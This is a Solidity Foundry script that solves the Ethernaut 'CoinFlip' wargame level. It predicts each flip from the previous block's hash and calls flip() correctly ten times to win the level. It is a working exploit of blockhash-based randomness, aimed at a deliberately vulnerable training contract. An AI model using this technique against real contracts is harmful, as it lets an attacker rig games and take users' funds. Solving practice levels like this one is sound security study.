// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {EthernautScript} from "src/common/EthernautScript.sol";
import {CoinFlip} from "./Problem.sol";
import "openzeppelin-contracts/math/SafeMath.sol";

contract CoinFlipSolution {
    using SafeMath for uint256;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastBlockValue;

    event GasBurned(uint256 indexed iteration);

    function guess(CoinFlip problem) external {
        // I had to add this block since forge will simulate the tx as if they are all on the same block even if using --slow parameter
        // TODO: Check if there is a better solution
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        if (blockValue == lastBlockValue) {
            // This branch should only be reached in the simulation of on-chain transactions (which will all be in the same block)
            // I have to burn gas here otherwise the gas estimation of forge script based on the simulated tx will be way off
            return;
        }
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        problem.flip(side);
        lastBlockValue = blockValue;
    }
}

contract SolutionScript is EthernautScript {
    using SafeMath for uint256;

    function solve(address payable _instanceAddress) internal override {
        vm.startBroadcast();

        CoinFlip problem = CoinFlip(_instanceAddress);
        CoinFlipSolution solution = new CoinFlipSolution();

        vm.roll(block.number - 10);
        solution.guess(problem);
        uint256 numGuesses = 10;
        for (uint256 i = 1; i < numGuesses; i++) {
            uint256 lastBlockNumber = block.number;
            vm.roll(lastBlockNumber + 1);
            solution.guess(problem);
        }

        assert(problem.consecutiveWins() == 10);

        vm.stopBroadcast();
    }

    function getLevelAddress() internal view override returns (address) {
        return 0x4dF32584890A0026e56f7535d0f2C6486753624f;
    }
}
